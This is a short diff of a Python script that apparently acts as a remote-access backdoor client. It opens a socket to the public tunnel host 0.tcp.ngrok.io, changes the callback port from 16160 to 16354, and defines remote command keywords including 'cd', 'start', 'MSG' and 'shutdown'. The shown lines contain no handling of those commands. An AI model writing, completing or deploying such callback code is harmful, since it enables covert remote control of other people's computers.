@@ -1,6 +1,6 @@
 import socket,os
 
-port = 16160
+port = 16354
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("0.tcp.ngrok.io",port))
 caract  = ["cd","start","cls","MSG","shutdown","py"]
